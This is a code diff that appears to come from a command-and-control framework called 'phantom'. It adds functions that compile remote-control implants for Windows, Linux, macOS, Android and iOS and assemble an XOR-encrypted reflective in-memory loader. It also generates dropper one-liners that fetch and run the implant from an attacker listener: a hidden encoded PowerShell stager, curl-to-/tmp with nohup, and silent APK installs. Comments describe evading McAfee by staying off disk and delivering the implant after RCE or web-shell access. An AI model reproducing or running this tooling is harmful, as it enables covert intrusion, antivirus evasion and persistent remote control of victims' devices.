+        raw_loader = _build_reflective_loader_bytes(pkg_root)
+        if not raw_loader:
+            return None
+        loader = bytearray(raw_loader)
+
+    marker = loader.find(b"\xAA\xBB\xCC\xDD")
+    if marker < 0:
+        notifier.error("Reflective loader marker not found; rebuild the loader.")
+        return None
+    # Same config block compile_beacon patches: QWORD dll_offset, QWORD
+    # entry RVA. For an EXE the entry RVA is AddressOfEntryPoint.
+    struct.pack_into("<Q", loader, marker + 4, len(loader))
+    struct.pack_into("<Q", loader, marker + 12, entry_rva)
+
+    with open(exe, "rb") as f:
+        pe = f.read()
+    combined = bytes(loader) + pe
+    out_path = os.path.join(remote_dir, "remote_mem.bin")
+    with open(out_path, "wb") as f:
+        f.write(_xor_encrypt(combined))
+    notifier.success(
+        f"Remote in-memory payload built: {out_path} "
+        f"({len(combined)} bytes, entry RVA 0x{entry_rva:x})")
+    return out_path
+
+
+def compile_remote(platform: str, pkg_root: str, force_rebuild: bool = False,
+                   host: str = "127.0.0.1", port: int = 8080,
+                   use_ssl: bool = True) -> Optional[str]:
+    """Compile the standalone remote-session module for a platform.
+
+    Unlike the beacon (PIC/reflective), this is a plain PE/ELF that speaks
+    the same C2 wire protocol — simpler to build, intentionally separate
+    from the beacon's evasion stack (it is dropped AFTER a foothold).
+    Returns the binary path or None.
+    """
+    _host_err = _callback_host_error(host)
+    if _host_err:
+        notifier.error(_host_err)
+        return None
+    if platform not in _REMOTE_OUT:
+        notifier.error(f"Remote module unsupported on: {platform}")
+        return None
+
+    remote_dir = os.path.abspath(os.path.join(pkg_root, "payloads", "remote"))
+    src_dir = os.path.join(remote_dir, "src")
+    out_name = _REMOTE_OUT[platform]
+    out_path = os.path.join(remote_dir, out_name)
+
+    if not force_rebuild and os.path.exists(out_path):
+        if platform == "windows" and not build_remote_mem_payload(pkg_root, out_path):
+            return None
+        return out_path
+
+    # Identity + crypto + C2 config for THIS build (fresh per build).
+    _remote_identity(remote_dir)
+    write_beacon_crypto_config(remote_dir, payload_token="")
+    # A-2 parity with the beacon: the remote module speaks the SAME TLS
+    # channel, so it must pin the same peer certificate (front cert when a
+    # TLS-terminating front is configured). Without this it accepted ANY TLS
+    # peer — only the HMAC authenticated the pointer, after the fact.
+    try:
+        from phantom.utils.network import (
+            beacon_pin, beacon_pubkey_pin, c2_pin_cert_path)
+        _pin_cert = c2_pin_cert_path()
+        _cert_pin = beacon_pin(_pin_cert)
+        _pk_pin = beacon_pubkey_pin(_pin_cert)
+    except Exception:
+        _cert_pin, _pk_pin = "", ""
+    if use_ssl and not _cert_pin and not _pk_pin:
+        notifier.warn(
+            "Remote module built WITHOUT a certificate pin: no C2 "
+            "certificate was found, so it will accept ANY TLS peer. "
+            "Generate the listener certificate first (lab: opt out via "
+            "PHANTOM_BEACON_PIN=0).")
+    write_beacon_c2_config(remote_dir, host=host, port=port, use_ssl=use_ssl,
+                           pin=_cert_pin, pubkey_pin=_pk_pin)
+
+    main_cpp = os.path.join(src_dir, "main.cpp")
+
+    if platform == "windows":
+        import shutil as _sh
+        def _find_tool(names):
+            for name in names:
+                p = _sh.which(name)
+                if p:
+                    return p
+            return None
+        mingw_cpp = _find_tool(["x86_64-w64-mingw32-g++", "g++"])
+        if not mingw_cpp:
+            notifier.error("No MinGW C++ compiler found for the remote module.")
+            return None
+        cmd = [mingw_cpp, "-std=c++20", "-O2", "-s", "-static", "-mwindows",
+               "-o", out_path,
+               f"-I{src_dir}",
+               main_cpp,
+               "-lwinhttp", "-lbcrypt", "-lws2_32", "-lgdi32", "-luser32",
+               "-lgdiplus", "-lole32", "-lwtsapi32", "-liphlpapi", "-lcrypt32"]
+        try:
+            subprocess.run(cmd, check=True, capture_output=True, text=True,
+                           timeout=600)
+        except subprocess.CalledProcessError as e:
+            notifier.error(f"Remote (Windows) build failed:\n{e.stderr[-2000:]}")
+            return None
+        mem_path = build_remote_mem_payload(pkg_root, out_path)
+        if not mem_path:
+            notifier.error("Remote module built, but the in-memory payload "
+                           "could not be assembled; refusing the on-disk path.")
+            return None
+        notifier.success(f"Remote module built: {out_path}")
+        return out_path
+
+    elif platform == "linux":
+        # Windows host: compile inside the Kali WSL distro (same as beacon).
+        wsl_prefix: list = []
+        wsl_dir = ""
+        if os.name == "nt":
+            from phantom.utils.build_helper import _wsl_cmd
+            wsl_prefix = _wsl_cmd(["true"])
+            if wsl_prefix:
+                wsl_prefix = wsl_prefix[:-1]
+                wsl_dir = _wsl_path(remote_dir)
+                src_inc = f"-I{wsl_dir}/src"
+        else:
+            src_inc = f"-I{src_dir}"
+
+        cmd = ["g++", "-std=c++20", "-O2", "-s", "-static",
+               "-o", out_name, src_inc, "src/main.cpp",
+               "-lssl", "-lcrypto", "-lzstd", "-lz", "-lpthread", "-ldl"]
+        if wsl_prefix:
+            fixed = []
+            skip = False
+            for part in cmd:
+                if skip:
+                    fixed.append(f"{wsl_dir}/{part}")
+                    skip = False
+                elif part == "-o":
+                    fixed.append(part)
+                    skip = True
+                elif part == "src/main.cpp":
+                    fixed.append(f"{wsl_dir}/src/main.cpp")
+                else:
+                    fixed.append(part)
+            try:
+                subprocess.run(wsl_prefix + fixed, check=True,
+                               capture_output=True, text=True, timeout=600)
+            except subprocess.CalledProcessError as e:
+                notifier.error(f"Remote (Linux/WSL) build failed:\n{e.stderr[-2000:]}")
+                return None
+        else:
+            try:
+                subprocess.run(cmd, cwd=remote_dir, check=True,
+                               capture_output=True, text=True, timeout=600)
+            except subprocess.CalledProcessError as e:
+                notifier.error(f"Remote (Linux) build failed:\n{e.stderr[-2000:]}")
+                return None
+        notifier.success(f"Remote module built: {out_path}")
+        return out_path
+
+    elif platform == "macos":
+        osxcross_root = os.environ.get("OSXCROSS_ROOT", "/opt/osxcross")
+        o32_cc = os.path.join(osxcross_root, "bin", "o32-clang++")
+        if not os.path.exists(o32_cc):
+            notifier.error(f"osxcross compiler not found at {o32_cc}")
+            return None
+        try:
+            subprocess.run(
+                [o32_cc, "-std=c++20", "-O2", "-o", out_name,
+                 f"-I{src_dir}", "src/main.cpp",
+                 "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
+                cwd=remote_dir, check=True, capture_output=True, text=True,
+                timeout=600)
+            notifier.success(f"Remote module built: {out_path}")
+            return out_path
+        except subprocess.CalledProcessError as e:
+            notifier.error(f"Remote (macOS) build failed:\n{e.stderr[-2000:]}")
+            return None
+
+    elif platform == "android":
+        return _compile_remote_android(remote_dir, out_path, notifier)
+
+    elif platform == "ios":
+        return _compile_remote_ios(remote_dir, out_path, notifier)
+
+    return None
+
+
+def _compile_remote_ios(remote_dir: str, out_path: str, notifier) -> Optional[str]:
+    """Build the iOS remote-session module (dylib) on macOS with Xcode.
+
+    Honest failure, never a fake success: an iOS remote module is a dylib
+    loaded inside an enterprise-signed, MDM-pushed app (ReplayKit capture +
+    UIKit synthetic events). Without macOS + Xcode + the iOS SDK it cannot
+    exist, and there is no cross-toolchain that produces a runnable one.
+    """
+    if os.name != "posix" or sys.platform != "darwin":
+        notifier.error("iOS remote builds require macOS + Xcode (no cross-toolchain).")
+        notifier.info("Build on a Mac, sign with an enterprise identity, deliver via MDM.")
+        return None
+    import shutil as _sh
+    if not _sh.which("xcrun"):
+        notifier.error("'xcrun' not found — install Xcode command line tools.")
+        return None
+    src_dir = os.path.join(remote_dir, "src")
+    ios_src = os.path.join(remote_dir, "ios")
+    if not os.path.isdir(ios_src):
+        notifier.error("iOS remote sources are missing (payloads/remote/ios).")
+        return None
+    sdk = os.environ.get(
+        "IOS_DEV_SDK",
+        "/Applications/Xcode.app/Contents/Developer/Platforms/"
+        "iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk")
+    if not os.path.isdir(sdk):
+        try:
+            sdk = subprocess.run(
+                ["xcrun", "--sdk", "iphoneos", "--show-sdk-path"],
+                capture_output=True, text=True, timeout=30).stdout.strip()
+        except Exception:
+            sdk = ""
+    if not sdk or not os.path.isdir(sdk):
+        notifier.error("iOS SDK path not found (set IOS_DEV_SDK).")
+        return None
+    try:
+        subprocess.run(
+            ["xcrun", "-sdk", "iphoneos", "clang++", "-std=c++20",
+             "-O2", "-fPIC", "-shared", "-dynamiclib", "-arch", "arm64",
+             "-o", out_path,
+             f"-I{src_dir}", f"-I{ios_src}",
+             os.path.join(ios_src, "main.mm"),
+             f"-isysroot{sdk}",
+             "-framework", "Foundation", "-framework", "UIKit",
+             "-framework", "ReplayKit"],
+            cwd=remote_dir, check=True, capture_output=True, text=True,
+            timeout=1200)
+        notifier.success(f"iOS remote module built: {out_path}")
+        return out_path
+    except subprocess.CalledProcessError as e:
+        notifier.error(f"Remote (iOS) build failed:\n{e.stderr[-2000:]}")
+        return None
+
+
+def _compile_remote_android(remote_dir: str, out_path: str, notifier) -> Optional[str]:
+    """Build the Android remote module (APK) with Gradle + the NDK.
+
+    Returns the APK path or None. The APK embeds the native bridge that reuses
+    remote_net.h, so it is wire-compatible with the desktop remote module.
+
+    Tooling requirements (honest failure, never a fake success):
+      * ANDROID_NDK_HOME / ANDROID_SDK_ROOT (or ANDROID_HOME) set
+      * a `gradle` on PATH or the project's ./gradlew wrapper
+    """
+    android_dir = os.path.join(remote_dir, "android")
+    if not os.path.isdir(android_dir):
+        notifier.error("Android remote sources are missing (payloads/remote/android).")
+        return None
+
+    ndk_home = os.environ.get("ANDROID_NDK_HOME", "")
+    sdk_home = (os.environ.get("ANDROID_SDK_ROOT")
+                or os.environ.get("ANDROID_HOME", ""))
+    if not ndk_home or not os.path.isdir(ndk_home):
+        notifier.error("ANDROID_NDK_HOME is not set (required for the native bridge).")
+        notifier.info("Install the Android NDK and export ANDROID_NDK_HOME=/path/to/ndk.")
+        return None
+    if not sdk_home or not os.path.isdir(sdk_home):
+        notifier.error("ANDROID_SDK_ROOT is not set (required for Gradle).")
+        notifier.info("Install the Android SDK and export ANDROID_SDK_ROOT=/path/to/sdk.")
+        return None
+
+    import shutil as _sh
+    gradlew = os.path.join(android_dir, "gradlew")
+    if os.name != "nt" and os.path.exists(gradlew):
+        gradle_cmd = [gradlew, "assembleRelease", "--no-daemon"]
+    else:
+        gradle_bin = _sh.which("gradle") or _sh.which("gradle.bat")
+        if not gradle_bin:
+            notifier.error("No `gradle` found on PATH (and no ./gradlew wrapper).")
+            return None
+        gradle_cmd = [gradle_bin, "assembleRelease", "--no-daemon"]
+
+    local_props = os.path.join(android_dir, "local.properties")
+    try:
+        with open(local_props, "w", encoding="utf-8") as f:
+            f.write(f"sdk.dir={sdk_home.replace(chr(92), '/')}\n")
+    except OSError as e:
+        notifier.error(f"Cannot write local.properties: {e}")
+        return None
+
+    env = dict(os.environ)
+    env["ANDROID_NDK_HOME"] = ndk_home
+    env["ANDROID_SDK_ROOT"] = sdk_home
+    env["REMOTE_SRC_DIR"] = os.path.join(remote_dir, "src")
+
+    try:
+        subprocess.run(gradle_cmd, cwd=android_dir, env=env, check=True,
+                       capture_output=True, text=True, timeout=1800)
+    except subprocess.CalledProcessError as e:
+        notifier.error(f"Remote (Android) build failed:\n{(e.stderr or '')[-2000:]}")
+        return None
+    except FileNotFoundError as e:
+        notifier.error(f"Remote (Android) build tool missing: {e}")
+        return None
+
+    produced = os.path.join(
+        android_dir, "app", "build", "outputs", "apk", "release", "app-release.apk")
+    if not os.path.exists(produced):
+        notifier.error("Gradle finished but no release APK was produced.")
+        return None
+    try:
+        _sh.copyfile(produced, out_path)
+    except OSError as e:
+        notifier.error(f"Cannot copy APK: {e}")
+        return None
+    notifier.success(f"Remote module built: {out_path}")
+    return out_path
+
+
+def _wsl_path(p: str) -> str:
+    p = os.path.abspath(p)
+    drive, rest = p[0].lower(), p[2:].replace("\\", "/")
+    return f"/mnt/{drive}{rest}"
+
+
+def generate_remote_dropper(platform: str, lhost: str, lport: int,
+                            use_ssl: bool = True,
+                            session_token: str = "") -> str:
+    """One-liner that downloads and runs the compiled remote module.
+
+    Serves the same role as the beacon dropper but for the remote module:
+    a disposable fetch+exec chain usable from RCE/cmdi/webshell contexts.
+    The module takes (host port use_https) as argv, so the compiled binary
+    can be pointed at any listener at drop time.
+
+    Review-3: when `session_token` is supplied (the C2 issues one per
+    remote session) the dropper carries `rs=<token>` — an expiring,
+    revocable grant — instead of the global payload token that unlocks
+    every payload forever.
+    """
+    _host_err = _callback_host_error(lhost)
+    if _host_err:
+        notifier.error(_host_err)
+        return ""
+    proto = "https" if use_ssl else "http"
+    if session_token:
+        token_param = f"rs={session_token}"
+    else:
+        from phantom.utils.c2_crypto import get_payload_token
+        token_param = f"auth={get_payload_token()}"
+
+    if platform == "windows":
+        # The remote module is now a reflective PIC payload (loader + remote
+        # PE), not a PE written to %TEMP% and started with CreateProcess.
+        # McAfee quarantined that on-disk PE; this path never touches disk.
+        url = (f"{proto}://{lhost}:{lport}"
+               f"/api/v1/remote_payload_windows_mem?{token_param}")
+        ps = _windows_pic_stager_script(url, _windows_stager_va_rva())
+        b64_ps = base64.b64encode(ps.encode('utf-16-le')).decode()
+        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64_ps}"
+
+    if platform == "linux":
+        url = f"{proto}://{lhost}:{lport}/api/v1/remote_payload_linux?{token_param}"
+        return (f"curl -sk '{url}' -o /tmp/.rdesk && chmod +x /tmp/.rdesk && "
+                f"nohup /tmp/.rdesk {lhost} {lport} {1 if use_ssl else 0} "
+                f"&>/dev/null &")
+
+    if platform == "macos":
+        url = f"{proto}://{lhost}:{lport}/api/v1/remote_payload_macos?{token_param}"
+        return (f"curl -sk '{url}' -o /tmp/.rdesk && chmod +x /tmp/.rdesk && "
+                f"nohup /tmp/.rdesk {lhost} {lport} {1 if use_ssl else 0} "
+                f"&>/dev/null &")
+
+    if platform == "android":
+        # Fetch + install the APK and launch its bootstrap activity. Delivery
+        # requires an existing shell (adb / RCE / beacon): the APK cannot
+        # install itself — that is a platform security boundary, not a bug.
+        url = f"{proto}://{lhost}:{lport}/api/v1/remote_payload_android?{token_param}"
+        return (f"curl -sk '{url}' -o /data/local/tmp/.srv.apk && "
+                f"pm install -g /data/local/tmp/.srv.apk && "
+                f"am start -n com.phantom.remote/.MainActivity")
 
     return ""
